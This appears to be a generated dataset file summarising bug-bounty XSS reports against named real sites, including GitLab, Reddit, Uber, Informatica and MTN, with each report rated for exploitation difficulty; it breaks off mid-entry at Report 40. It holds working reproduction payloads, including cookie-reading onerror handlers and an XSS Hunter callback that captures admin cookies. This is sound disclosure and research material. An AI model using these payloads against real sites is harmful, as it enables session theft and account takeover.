@@ -1,0 +1,2259 @@
+low Complexity Injection Vulnerabilities Analysis
+==================================================
+
+Total reports analyzed: 161
+
+Weaknesses.XSS Vulnerabilities (86 reports)
+--------------------------------------------------
+
+Report 1: Cross-site Scripting (XSS) - DOM - iqcard.informatica.com
+================================================================================
+Vulnerability Description:
+The vulnerability is a DOM-based XSS in the attach.html page of iqcard.informatica.com. The page takes user input from the URL after the '?' character and passes it directly to document.location.replace() without any sanitization, allowing execution of arbitrary JavaScript code or redirection to malicious sites.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://iqcard.informatica.com/pub/fujitsu/fm3v2/player/attach.html?javascript:alert(1)
+2. Observe that the JavaScript code in the alert() function is executed due to the DOM XSS vulnerability
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a single component (the URL parameter) and the exploitation is direct with no need for complex interactions or state manipulation. The vulnerability follows a common pattern of unsanitized URL parameters being used in JavaScript functions.
+
+--------------------------------------------------------------------------------
+
+Report 2: Blind Stored XSS on https://█████████ after filling a request at https://█████
+================================================================================
+Vulnerability Description:
+The vulnerability is a Blind Stored XSS in the description field of a request submission form. The input is not sanitized, allowing malicious JavaScript to be stored and executed when an administrator views the request, potentially leading to credential leakage.
+
+Steps to Reproduce:
+1. Register or log in to the target website.
+2. Navigate to the request submission page.
+3. Craft and submit an XSS payload in the description field.
+4. Navigate to the request status page to observe the XSS execution.
+Exploitation Difficulty:
+The attack involves straightforward steps without complex interactions or state manipulations. The XSS payload execution is direct once the request is submitted and viewed by an administrator.
+
+--------------------------------------------------------------------------------
+
+Report 3: Stored XSS in Intense Debate comment system
+================================================================================
+Vulnerability Description:
+The Intense Debate comment system is vulnerable to stored Cross-Site Scripting (XSS) via image tags with malicious 'onload' attributes. This allows attackers to execute arbitrary JavaScript in the context of other users' sessions, potentially leading to cookie theft, session hijacking, or phishing attacks.
+
+Steps to Reproduce:
+1. Navigate to intensedebate.com/moderate/{{-ID-}} and enable 'Allow images in comments' in the moderation settings.
+2. Post a comment containing the XSS payload: `<img src="https://intensedebate.com/images/a-addblog.png" onload="alert()">` on a blog using Intense Debate.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a basic XSS payload in a common HTML attribute ('onload'). The attack requires no complex application state manipulation or understanding of subtle interactions between components. The only prerequisite (enabling images in comments) is a standard feature with no obfuscation.
+
+--------------------------------------------------------------------------------
+
+Report 4: [now.informatica.com] Reflective XSS
+================================================================================
+Vulnerability Description:
+This is a Reflective Cross-Site Scripting (XSS) vulnerability found on the Informatica website. The vulnerability allows an attacker to inject arbitrary JavaScript code via the 'company_name' parameter, which is then executed in the context of the victim's browser when the page is loaded.
+
+Steps to Reproduce:
+1. Navigate to http://now.informatica.com/launch-next-bigdata-registration-inxpo.html?Source=homepage
+2. In the 'company_name' parameter, inject the payload: '"><img src=x onerror=alert(1)>'
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple injection into a URL parameter without any need for complex interactions or state manipulation. The payload is a standard XSS test string, and the parameter is directly reflected in the response.
+
+--------------------------------------------------------------------------------
+
+Report 5: Stored XSS through name / last name on https://██████████/
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the account name and last name fields on the target website. By injecting a malicious script into these fields, an attacker can execute arbitrary JavaScript in the context of the victim's browser when the victim views their account page.
+
+Steps to Reproduce:
+1. Navigate to the registration page at https://█████/login/?next=/███%3Fresponse_type%3Dcode%26redirect_uri%3Dhttps%253A%252F%252F████████%252Fcgi%252Flogin.cgi%253Freturn_to%253Dhttps%25253A%25252F%25252F███████%25252Fcgi%25252Fmyaccount.cgi%26client_id%3D6G3AXPQNPXK5SVESYCB8AMCPHQQ3ENCRK8G2QNWY%26state%3DBEAEb6NGMQ7kWZwZS2pNNFv4p7JwBk86%26scope%3Dopenid%2520profile
+2. Create an account with the name or last name field containing the XSS payload: <IMG SRC=X ONERROR=ALERT(1)>
+3. Log in and navigate to the account page at https://███/██████ to trigger the XSS payload
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS payload in standard input fields. No complex interactions or state manipulations are required, and the attack vector is well-known.
+
+--------------------------------------------------------------------------------
+
+Report 6: Stored XSS at https://www.█████████.mil
+================================================================================
+Vulnerability Description:
+Stored XSS vulnerability exists where a user can upload a file containing malicious JavaScript code, which is then executed when the file is accessed.
+
+Steps to Reproduce:
+1. Go to https://www.██████.mil/jppso/vendor/WFDPMMiscInvoicingDocuments.aspx
+2. Fill out the form, upload a file containing javascript code, and submit
+3. After upload, inspect the page to find the file path in Developer Tools
+4. Access the uploaded file URL directly to trigger the XSS
+Exploitation Difficulty:
+The vulnerability involves a straightforward file upload mechanism without proper content validation or sanitization. The attack does not require complex interactions or understanding of subtle application behaviors.
+
+--------------------------------------------------------------------------------
+
+Report 7: Stored DOM XSS via Mermaid chart
+================================================================================
+Vulnerability Description:
+The vulnerability is a Stored DOM XSS via Mermaid chart in GitLab, where user-supplied input in Mermaid directives is not properly sanitized before being inserted into the DOM via innerHTML, allowing for arbitrary JavaScript execution.
+
+Steps to Reproduce:
+1. Create an issue in any repository
+2. Insert the Mermaid diagram with the malicious payload: %%{init: { 'fontFamily': '"></style><img src=x onerror=alert(document.cookie)>'} }%%
+3. Save the issue and observe the XSS trigger when the page is opened
+Exploitation Difficulty:
+The vulnerability involves understanding the Mermaid directive syntax and how it interacts with the DOM, but the attack itself is straightforward once the directive syntax and the lack of sanitization are known. The complexity is increased slightly by the need to bypass CSP in some environments, but the core vulnerability is not highly complex.
+
+--------------------------------------------------------------------------------
+
+Report 8: Blind Stored XSS on ███████  leads to takeover admin account
+================================================================================
+Vulnerability Description:
+A Blind Stored XSS vulnerability exists in the profile fields (First name, last name, company name, title) of the target application. The application fails to properly sanitize user input, allowing an attacker to inject malicious JavaScript payloads. When an administrator views the affected profile, the payload executes in the admin's context, leaking sensitive information such as cookies, IP address, and backend details.
+
+Steps to Reproduce:
+1. Go to the URL by opening your account: https://█████/█████████
+2. Enter the XSS payload in the First name, last name, company name, or title fields: data: "><img src="https://hemantsolo.xss.ht>/index.html?c=hemantsolo_xss" />
+3. Wait for the XSS Hunter report to be triggered when an admin views the profile, capturing sensitive information.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves basic XSS payload testing in common input fields. The attack does not require complex interactions, state manipulation, or novel logic. The only non-trivial aspect is the blind nature of the XSS, but this is mitigated by using standard XSS Hunter tools.
+
+--------------------------------------------------------------------------------
+
+Report 9: Stored XSS in custom emoji
+================================================================================
+Vulnerability Description:
+A stored Cross-Site Scripting (XSS) vulnerability exists in GitLab's custom emoji feature due to insufficient escaping of the `src` attribute in the `emoji_image_tag` function. This allows an attacker to inject malicious JavaScript code via a crafted emoji URL, which is executed when the emoji is rendered in the browser.
+
+Steps to Reproduce:
+1. Enable the custom emoji feature flag in a self-managed GitLab installation using the GitLab Rails console: `Feature.enable(:custom_emoji)`.
+2. Create a custom emoji via GraphQL mutation with a malicious URL payload: `mutation { createCustomEmoji(input: { groupPath: "xss_target", name:"xssreplace", url:"http://aaa#'><img onerror=alert(location) src=.>" }) { customEmoji { id name url } } }`.
+3. Use the custom emoji in a project file (e.g., README.md) with the syntax `:xssreplace:`.
+4. View the rendered file in a browser to trigger the XSS payload.
+Exploitation Difficulty:
+The vulnerability involves enabling a feature flag, crafting a GraphQL mutation, and understanding the rendering context of custom emojis. While the steps are straightforward, the need to enable a feature flag and use GraphQL adds some complexity.
+
+--------------------------------------------------------------------------------
+
+Report 10: Stored XSS in main page of a project caused by arbitrary script payload in group "Default initial branch name"
+================================================================================
+Vulnerability Description:
+A stored XSS vulnerability exists in the main page of a GitLab project, allowing arbitrary JavaScript execution by manipulating the 'Default initial branch name' setting in a group. This can lead to various malicious actions depending on the CSP settings, including token generation and complete system compromise if the victim is an administrator.
+
+Steps to Reproduce:
+1. Log in as attacker01
+2. Create a group 'attack_group'
+3. Navigate to group settings and set 'Default initial branch name' to a script payload (e.g., <script>alert(1);</script>)
+4. Save the changes
+5. Create a new project under 'attack_group'
+6. Observe the script execution on the project's main page
+7. Optional: Invite another user as a Developer and observe script execution when they visit the project
+Exploitation Difficulty:
+The vulnerability involves manipulating a group setting to inject a script that executes on project creation. While the steps are straightforward, the impact varies based on CSP settings, adding some complexity. The attack does not require novel logic or complex state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 11: Reflected Cross-Site scripting in : mtn.bj
+================================================================================
+Vulnerability Description:
+A Reflected Cross-Site Scripting (XSS) vulnerability exists in mtn.bj, where an attacker can execute arbitrary JavaScript code by uploading a file with a maliciously crafted filename. This allows the attacker to steal sensitive information such as cookies or session tokens from users who interact with the affected page.
+
+Steps to Reproduce:
+1. Navigate to the target website (mtn.bj)
+2. Enter any email and press 'Suivant'
+3. Fill all input fields with arbitrary data
+4. Upload a photo with the malicious filename: "><img src=x onerror=alert(document.cookie);.jpg
+5. Observe the payload execution in the page
+Exploitation Difficulty:
+The vulnerability involves a straightforward file upload with a malicious filename, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require any complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 12: Stored XSS in merge request creation page through payload in approval rule name
+================================================================================
+Vulnerability Description:
+Stored XSS in merge request creation page through payload in approval rule name, bypassing CSP and allowing full JavaScript execution
+
+Steps to Reproduce:
+1. Create two user accounts: attacker_user (with premium features) and victim_user
+2. Attacker creates a project and adds an approval rule with XSS payload as the name
+3. Attacker invites victim_user to the project as a Developer
+4. Victim logs in, creates a branch and attempts to create a merge request
+5. Victim opens the 'Reviewers' dropdown, triggering the XSS payload
+Exploitation Difficulty:
+The attack requires understanding of multiple components (approval rules, merge request workflow, CSP bypass techniques) and involves non-obvious interaction between these components. The attacker needs to manipulate application state by creating specific project settings and user permissions.
+
+--------------------------------------------------------------------------------
+
+Report 13: POST BASED REFLECTED XSS IN dailydeals.mtn.co.za
+================================================================================
+Vulnerability Description:
+A post based reflected XSS vulnerability in https://dailydeals.mtn.co.za/ allows an attacker to execute arbitrary JavaScript code in the context of the victim's browser, potentially leading to cookie theft, redirection to malicious sites, and other attacks.
+
+Steps to Reproduce:
+1. Create a html file with following content.
+2. Open the HTML file in any web-browser.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves basic XSS testing techniques without requiring complex interactions or state manipulation. The attack is simple and does not involve multiple components or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 14: Reflected xss in https://sh.reddit.com
+================================================================================
+Vulnerability Description:
+Reflected cross-site scripting (XSS) vulnerability in https://sh.reddit.com where an attacker can execute malicious JavaScript and steal cookies by manipulating the 'see more' option at the end of the page.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://sh.reddit.com
+2. Scroll to the page end and find the 'see more' option. Move the mouse over it and observe the execution of JavaScript.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple interaction with a visible UI element ('see more') and does not require complex state manipulation or understanding of subtle interactions between components.
+
+--------------------------------------------------------------------------------
+
+Report 15: New /add_contacts /remove_contacts quick commands susseptible to XSS from Customer Contact firstname/lastname fields
+================================================================================
+Vulnerability Description:
+Cross-site scripting (XSS) vulnerability in GitLab's Customer Relations feature where malicious JavaScript can be executed via contact first/last names when using quick commands.
+
+Steps to Reproduce:
+1. Create a new group and enable 'Customer Relations' in group settings.
+2. Create a contact with XSS payload in first/last name fields.
+3. Create a new project under the same group.
+4. Create a new issue and trigger XSS via '/add_contacts' command.
+Exploitation Difficulty:
+The attack requires understanding of GitLab's new Customer Relations feature and its quick commands, but the XSS vector is straightforward once the feature is discovered. No complex state manipulation or novel logic is required.
+
+--------------------------------------------------------------------------------
+
+Report 16: CSP-bypass XSS in project settings page
+================================================================================
+Vulnerability Description:
+The vulnerability is a CSP-bypass XSS in the project settings page where user-controlled input (deployment key title) is rendered without proper sanitization, allowing execution of arbitrary JavaScript despite Content Security Policy restrictions.
+
+Steps to Reproduce:
+1. Navigate to project settings and add a deploy key with a malicious script in the title field
+2. Access the protected branches section to trigger execution of the injected script
+Exploitation Difficulty:
+While the vulnerability involves understanding how user input flows through the system and bypasses CSP, the attack vector is relatively straightforward once the unsanitized input field is identified. The main complexity comes from recognizing the jQuery rendering behavior that bypasses CSP's 'strict-dynamic' restriction.
+
+--------------------------------------------------------------------------------
+
+Report 17: Reflected xss on videostore.mtnonline.com
+================================================================================
+Vulnerability Description:
+This is a reflected Cross-Site Scripting (XSS) vulnerability on videostore.mtnonline.com. The vulnerability allows an attacker to inject arbitrary JavaScript code via a crafted URL parameter, which is then executed in the context of the victim's browser session.
+
+Steps to Reproduce:
+1. Open a browser and navigate to the URL: https://videostore.mtnonline.com/GL/Default.aspx?PId=126&CId=5&OprId=11&Ctg=OF25MTNNGVS_LapsInTime%22%27testxxx%3E%3Ciframe%20src=%22data:text/html,%3C%73%63%72%69%70%74%3E%61%6C%65%72%74%28%31%29%3C%2F%73%63%72%69%70%74%3E%22%3E%3C/iframe%3E
+2. Observe that the browser executes the injected JavaScript code, showing an alert popup
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple injection of JavaScript code through a URL parameter, a common and well-documented attack vector. The attack does not require multiple components, complex application states, or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 18: [kb.informatica.com] Stored XSS
+================================================================================
+Vulnerability Description:
+kb.informatica.org is vulnerable to stored XSS as it stores user input in users' sessions, then reflects this input back inside a JavaScript block without adequate escaping.
+
+Steps to Reproduce:
+1. Visit https://kb.informatica.com/kbexternal/Pages/KBSearchResults.aspx?k=Support%20Console&fromsource=11171"%3balert(1)%2f%2f535 to store the XSS payload in your session.
+2. Visit https://kb.informatica.com/faq/1/Pages/17033.aspx?docid=17033&type=external&isSearch=external to trigger the stored XSS payload, resulting in an alert.
+Exploitation Difficulty:
+The attack involves a straightforward stored XSS vulnerability where the payload is stored in the session and reflected in a JavaScript block. The steps are simple and do not require complex interactions or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 19: [marketplace.informatica.com] Persistent XSS through document title
+================================================================================
+Vulnerability Description:
+Document titles are not properly escaped before being printed on https://marketplace.informatica.com/docs/. By including a payload in a document title, an attacker can create a document with a persistent XSS vector which executes for anyone viewing the document page.
+
+Steps to Reproduce:
+1. Log into https://marketplace.informatica.com/ and go to your profile page. Select New -> Document.
+2. Choose a location for your new document - 'Your Documents' will work just fine.
+3. Enter some text in the document body and insert the following XSS vector in the document title: ";alert("XSS in "+document.domain);//
+4. Hit 'Publish' on the bottom of the page.
+5. Visiting the document page causes the XSS payload to execute.
+Exploitation Difficulty:
+The vulnerability involves a straightforward XSS injection in a document title field, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require any complex interactions or state manipulations.
+
+--------------------------------------------------------------------------------
+
+Report 20: Store XSS
+================================================================================
+Vulnerability Description:
+This is a stored Cross-Site Scripting (XSS) vulnerability where the company name field is vulnerable to XSS attacks. By injecting a malicious script into the company name field, the script is stored and later executed when the message option is accessed, leading to arbitrary JavaScript execution.
+
+Steps to Reproduce:
+1. Enter the XSS payload as the company name: “><IMG SRC=x onerror=javascript:alert(&quot;XSS-by-Imran&quot;)>
+2. After logging in, navigate to the message option where the XSS payload will be executed, triggering a pop-up alert.
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS payload in a user-controllable input field. The attack does not require multiple components, complex state manipulation, or novel logic. The interaction is direct and obvious once the input field is identified as vulnerable.
+
+--------------------------------------------------------------------------------
+
+Report 21: [careers.informatica.com] XSS on "isJTN"
+================================================================================
+Vulnerability Description:
+The vulnerability is a Cross-Site Scripting (XSS) issue in the 'isJTN' parameter of the careers.informatica.com website. By injecting a malicious script into the 'isJTN' parameter, an attacker can execute arbitrary JavaScript code in the context of the victim's browser session.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://careers.informatica.com/apply?applySource=Quick%20Apply&isJTN=</ScrIpt><SCRIPT>+alert("X");</SCRIPT>true&isQuickApply=false
+2. Observe that the JavaScript alert with the message 'X' is executed in the browser (tested on Firefox 50.0.2 and older versions of Chrome).
+Exploitation Difficulty:
+The attack involves a straightforward injection of a script tag into a URL parameter, which is a common and well-documented technique for XSS vulnerabilities. There are no complex interactions or state manipulations required, and the vulnerability does not rely on novel or obscure logic.
+
+--------------------------------------------------------------------------------
+
+Report 22: Stored Xss On "https://www.question.com/"
+================================================================================
+Vulnerability Description:
+Stored XSS vulnerability on the question submission page of https://www.question.com/, where injecting a malicious iframe payload results in persistent execution of arbitrary JavaScript when the question is viewed.
+
+Steps to Reproduce:
+1. Navigate to the site https://www.question.com/ask/
+2. Submit a question with the payload <iframe onload=alert(document.domail)>
+Exploitation Difficulty:
+The attack involves a straightforward injection of a common XSS payload without any need for complex interactions, state manipulation, or novel logic. The vulnerability is easily reproducible with basic knowledge of XSS techniques.
+
+--------------------------------------------------------------------------------
+
+Report 23: Stored XSS on new Calling plugin (spreed)
+================================================================================
+Vulnerability Description:
+There is a stored XSS vulnerability in the spreed (Calling plugin) where an attacker can inject a malicious script that gets stored and executed when an admin user views the affected page, especially in browsers like Internet Explorer.
+
+Steps to Reproduce:
+1. Invite people to a single call room in the spreed (Calling plugin).
+2. Inject a malicious script payload that will be stored and executed when viewed by an admin user (particularly in browsers like IE).
+Exploitation Difficulty:
+The vulnerability is straightforward to exploit once the XSS vector is identified. It does not involve complex interactions or state manipulations, and the attack logic is common for stored XSS vulnerabilities.
+
+--------------------------------------------------------------------------------
+
+Report 24: DOM Based XSS in Discourse Search
+================================================================================
+Vulnerability Description:
+This is a DOM-based XSS vulnerability in Discourse's search functionality. By injecting a malicious script into the search input, an attacker can execute arbitrary JavaScript in the context of the victim's browser session when they interact with the advanced search feature.
+
+Steps to Reproduce:
+1. Load http://try.discourse.org
+2. Click on the search button in the top right corner
+3. Enter the payload: @<script>prompt(1337)</script>gmail.com
+4. Click on 'advanced search' in the new window that opens to trigger the XSS
+5. Copy the link and send it to a victim to trigger the XSS in their browser
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of a script payload into a search input field, which is a common and well-documented attack vector. The steps to reproduce are simple and do not require deep understanding of the application's internal state or complex interactions between components.
+
+--------------------------------------------------------------------------------
+
+Report 25: XSS Vulnerability on Image link parser
+================================================================================
+Vulnerability Description:
+The vulnerability is an XSS (Cross-Site Scripting) issue in the markdown parser when processing image URLs. By crafting a malicious image URL with an XSS payload, an attacker can break out of the 'img' tag and execute arbitrary JavaScript code.
+
+Steps to Reproduce:
+1. Create a markdown content with an image URL that includes an XSS payload, e.g., http://host/path/to/image'onerror=alert(1);//.png
+2. Submit or render the markdown content in the vulnerable application
+Exploitation Difficulty:
+The attack is straightforward and involves a single component (the image URL in markdown). The interaction is obvious (breaking out of the 'img' tag with a quote), and the logic is commonly seen in XSS vulnerabilities.
+
+--------------------------------------------------------------------------------
+
+Report 26: XSS vulnerability on Audio and Video parsers
+================================================================================
+Vulnerability Description:
+The vulnerability is an XSS (Cross-Site Scripting) issue in the audio and video parsers of the application. By injecting a maliciously crafted URL containing a single quote and JavaScript code, an attacker can execute arbitrary JavaScript in the context of the user's browser session.
+
+Steps to Reproduce:
+1. Identify an audio or video parser in the application that processes user-provided URLs.
+2. Craft a malicious URL with an XSS payload, such as: http://host/path'onerror=alert(1);//k.mp3 for audio or http://host/path'onerror=alert(1);//k.mp4 for video.
+Exploitation Difficulty:
+The attack is straightforward and does not involve multiple components or complex interactions. The vulnerability is a classic XSS flaw that requires only the injection of a simple payload into a URL, which is a well-known and common attack vector.
+
+--------------------------------------------------------------------------------
+
+Report 27: [accounts.reddit.com] Redirect parameter allows for XSS
+================================================================================
+Vulnerability Description:
+The 'dest' parameter in accounts.reddit.com is vulnerable to Cross-Site Scripting (XSS) when a user logs in after being redirected to a malicious JavaScript URL.
+
+Steps to Reproduce:
+1. Navigate to the following link: https://accounts.reddit.com/?dest=javascript:alert(document.domain)
+2. If not signed in, log in to trigger the XSS execution. If already logged in, the XSS will execute immediately upon visiting the link.
+Exploitation Difficulty:
+The vulnerability involves a straightforward manipulation of a URL parameter to inject JavaScript, which is a common and well-documented attack vector. The discovery does not require understanding complex application states or novel logic.
+
+--------------------------------------------------------------------------------
+
+Report 28: Stored XSS in posts because of absence of oembed variables values escaping
+================================================================================
+Vulnerability Description:
+The vulnerability is a stored XSS in posts due to the absence of escaping in oembed variable values. When a malicious oembed URL is embedded in a post, it fetches JSON data that contains unescaped JavaScript, which is then executed in the context of the page when the post is viewed.
+
+Steps to Reproduce:
+1. Paste the payload URL 'http://89.223.28.48/oembed_video.html?uncache' into a post.
+2. Save the post to trigger the XSS payload when the post is viewed.
+Exploitation Difficulty:
+The attack involves understanding the oembed protocol and crafting a malicious JSON response that includes unescaped JavaScript. While the components are straightforward (oembed URL and JSON response), the interaction between them is non-obvious as it requires knowledge of how the onebox parser processes oembed data and injects it into the page.
+
+--------------------------------------------------------------------------------
+
+Report 29: Stored XSS via transloadit.com and imageproxy
+================================================================================
+Vulnerability Description:
+This vulnerability is a stored XSS via transloadit.com and imageproxy. It allows an attacker to upload an HTML file containing malicious JavaScript, which is then stored and executed when the file is processed by the server, leading to potential cookie theft or other malicious actions.
+
+Steps to Reproduce:
+1. Send an HTML file with a trivial XSS vector to transloadit.com via a POST request to /assemblies/[hash]?redirect=false
+2. The HTML file contains a script that executes alert(document.cookie) when processed by the server
+Exploitation Difficulty:
+The attack is straightforward and involves a single component (uploading a malicious HTML file). There are no complex interactions or state manipulations required, and the XSS vector is a common and well-known technique.
+
+--------------------------------------------------------------------------------
+
+Report 30: Stored XSS on Files overview by abusing git submodule URL
+================================================================================
+Vulnerability Description:
+A stored Cross-Site Scripting (XSS) vulnerability exists in the Files overview of a project due to incorrect handling of a git submodule URL. An attacker can inject a JavaScript payload into the .gitmodules file, which gets executed when a user interacts with the affected directory in the Files overview.
+
+Steps to Reproduce:
+1. Clone the project and project.wiki repositories
+2. Initialize both repositories with a file and push changes
+3. Add the project.wiki as a relative git submodule to the project
+4. Modify the .gitmodules file to change the URL to a JavaScript payload
+5. Commit and push the changes to the project
+6. Navigate to the project's Files overview and click the wiki directory to trigger the XSS
+Exploitation Difficulty:
+This vulnerability involves multiple steps including repository cloning, submodule manipulation, and understanding how GitLab handles submodule URLs. The attack requires knowledge of Git submodules and the specific behavior of GitLab's file handling, but the steps are straightforward once the initial setup is understood.
+
+--------------------------------------------------------------------------------
+
+Report 31: Store XSS on Informatica University via transcript (informatica.csod.com)
+================================================================================
+Vulnerability Description:
+This is a stored Cross-Site Scripting (XSS) vulnerability in Informatica University's training transcript feature. The vulnerability allows an attacker to inject malicious JavaScript code via the Training Description field in the 'Add external training' form. The injected code is then executed when the training details are viewed, potentially leading to session hijacking or other malicious actions.
+
+Steps to Reproduce:
+1. Login to your account and navigate to Informatica University.
+2. Go to 'My Training' or 'Universal Profile' at the upper right corner of the page.
+3. Click on the 'Transcript' tab in the Universal profile bio page.
+4. Select 'Add external training' from the options drop-down on the upper right side.
+5. Fill out the form, using the payload '"><img src=x onerror=alert(document.cookie);> in the Training Description field.
+6. Submit the form and return to your training transcript.
+7. Select 'View training details' from the drop-down next to the training entry.
+8. Observe the XSS pop-up when the page redirects.
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection into a form field, with the payload being executed upon viewing the stored data. There are no complex interactions between components or novel logic required to exploit this vulnerability. The steps to reproduce are linear and do not require deep understanding of the application's architecture or state manipulation.
+
+--------------------------------------------------------------------------------
+
+Report 32: XSS via /api/v1/chat.postMessage 
+================================================================================
+Vulnerability Description:
+An attacker can craft a custom message with an attachment containing malicious HTML in the field value, which executes arbitrary JavaScript code in the context of the client user when viewed.
+
+Steps to Reproduce:
+1. Login to the REST API to obtain an authentication token and user ID.
+2. Send a crafted message using the chat.postMessage API endpoint with malicious HTML in the attachment field value.
+Exploitation Difficulty:
+The vulnerability involves understanding the API's handling of message attachments and the specific condition where HTML injection is possible (when the field value starts with '<'). However, the attack is straightforward once the API's behavior is known.
+
+--------------------------------------------------------------------------------
+
+Report 33: [GitHub Extension] Unsanitised HTML leading to XSS on GitHub.com
+================================================================================
+Vulnerability Description:
+The Awesome Autocomplete for GitHub extension fails to properly sanitize HTML input, leading to Cross-Site Scripting (XSS) vulnerabilities on GitHub.com. This allows attackers to inject arbitrary HTML and JavaScript code through search queries, which is then executed in the context of GitHub.com.
+
+Steps to Reproduce:
+1. Search for '"><img src=x onerror= on GitHub.com and observe the broken <img> element
+2. Search for a'"<h1 on GitHub.com to trigger a JavaScript alert dialog
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves basic XSS payloads and does not require complex interactions between components or manipulation of application states. The attack leverages common XSS techniques and the only non-trivial aspect is identifying that the extension does not sanitize HTML input.
+
+--------------------------------------------------------------------------------
+
+Report 34: Cross-site Scripting (XSS) in /updates-pro/archive/
+================================================================================
+Vulnerability Description:
+The dir parameter on /updates-pro/archive/ is vulnerable to Cross-site Scripting (XSS), allowing an attacker to inject arbitrary JavaScript code via the dir parameter.
+
+Steps to Reproduce:
+1. Navigate to: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1
+2. Add this to the url: <svG onLoad=prompt(9)> or visit: https://www.mapsmarker.com/updates-pro/archive/?dir=v3.0.1%3CsvG%20onLoad=prompt(1)%3E
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple XSS payload injected directly into a URL parameter. No complex interactions, application state manipulation, or novel logic is required.
+
+--------------------------------------------------------------------------------
+
+Report 35: Blind stored xss [parcel.grab.com] > name parameter 
+================================================================================
+Vulnerability Description:
+A blind stored XSS vulnerability exists in the 'name' parameter of the user account creation process on parcel.grab.com. This vulnerability allows an attacker to inject malicious JavaScript that executes when an administrator views the user list on app.detrack.com/a/, potentially leading to data theft or session hijacking.
+
+Steps to Reproduce:
+1. Create a new account on https://parcel.grab.com/ with the name parameter set to a XSS payload: "><script src=https://x.com></script>
+2. Navigate to the admin panel at https://app.detrack.com/a/ where the XSS payload will execute when the admin views the user list, potentially exposing sensitive user data.
+Exploitation Difficulty:
+The vulnerability involves a straightforward XSS injection in a user-controllable field that persists and executes in a different administrative context. While it requires understanding where the input is reflected, the attack itself is not complex and follows common XSS patterns.
+
+--------------------------------------------------------------------------------
+
+Report 36: The Custom Emoji Page has a Reflected XSS
+================================================================================
+Vulnerability Description:
+The Custom Emoji Page has a Reflected XSS vulnerability in the building flash message. The vulnerability allows an attacker to inject arbitrary JavaScript code via the 'name' parameter in the URL, which is then executed in the context of the user's browser.
+
+Steps to Reproduce:
+1. Navigate to the custom emoji page URL: https://{team}.slack.com/customize/emoji
+2. Append the following query string to the URL: ?added=1&name=vuln"><script>alert(0);<%2Fscript>
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a simple reflected XSS attack via URL parameter manipulation. There are no complex interactions or state manipulations required, and the attack vector is a common one in web applications.
+
+--------------------------------------------------------------------------------
+
+Report 37:  Potential XSS Vulnerability in Acronis Login Callback URL
+================================================================================
+Vulnerability Description:
+The login callback URL is vulnerable to Cross-Site Scripting (XSS) attacks due to improper sanitization of the redirectUrl parameter, allowing arbitrary JavaScript execution in the victim's browser upon login.
+
+Steps to Reproduce:
+1. Craft a URL with a malicious JavaScript payload in the redirectUrl parameter, e.g., https://learn.acronis.com/portal/login-callback?redirectUrl=javascript:alert(document.domain)
+2. Have a victim click the crafted URL and log in to trigger the XSS payload
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS vector (URL parameter injection) with no complex interactions or state manipulation required. The attack follows a predictable pattern of URL crafting and victim interaction.
+
+--------------------------------------------------------------------------------
+
+Report 38: Report Design Critical Stored DOM XSS Vulnerability 
+================================================================================
+Vulnerability Description:
+This is a critical Stored DOM XSS vulnerability in the report designer. An attacker can inject malicious JavaScript code into the report's overview table, which is then executed when the report is viewed by another user.
+
+Steps to Reproduce:
+1. Navigate to the report creation URL: https://infogram.com/app/#edit/e7b161f1-f708-48e5-bab7-de9887ae202a
+2. Insert the sample data into the report's overview table: <a href="" onmouseover="javascript:alert('HackerOne MkSecurity Dom XSS');">Click for Detail</a>
+3. Access the sample URL to trigger the XSS: https://infogram.com/report-classic-1g57pr0g3xdvp01
+Exploitation Difficulty:
+The vulnerability involves a straightforward injection of malicious HTML/JavaScript into a field that is rendered without proper sanitization. The attack does not require complex interactions or manipulation of application states.
+
+--------------------------------------------------------------------------------
+
+Report 39: XSS on infogram.com
+================================================================================
+Vulnerability Description:
+This is a Cross-Site Scripting (XSS) vulnerability in the 'Report Classic' template on infogram.com. By modifying table values, an attacker can inject malicious JavaScript payloads that execute when the template is rendered.
+
+Steps to Reproduce:
+1. Navigate to infogram.com and select the 'Report Classic' template under free templates.
+2. Modify the values in the table to insert the XSS payload: "><img src=x onerror=prompt(0);> or "/><svg/onload=alert(0);>
+Exploitation Difficulty:
+The vulnerability is straightforward to discover as it involves a common XSS payload and does not require complex interactions or state manipulation. The attack surface is limited to modifying table values in a template, which is a typical place to test for XSS.
+
+--------------------------------------------------------------------------------
+
+Report 40: SSL-protected Reflected XSS in m.uber.com
+================================================================================
+Vulnerability Description:
+The m.uber.com website is vulnerable to reflected Cross-Site Scripting (XSS) through a malformed URL parameter. The vulnerability allows an attacker to inject arbitrary JavaScript code that gets executed in the context of the victim's browser session when they visit a specially crafted URL. This could be used to steal sensitive information like login credentials, payment details, or perform other malicious actions.
+
+Steps to Reproduce:
+1. Navigate to the URL: https://m.uber.com/?bjbxm%3c%2fscript%3e%3cscript%3ealert(1)%3c%2fscript%3exrii5=1
+2. Observe the reflected XSS payload executing in the browser, demonstrating the vulnerability
+Exploitation Difficulty:
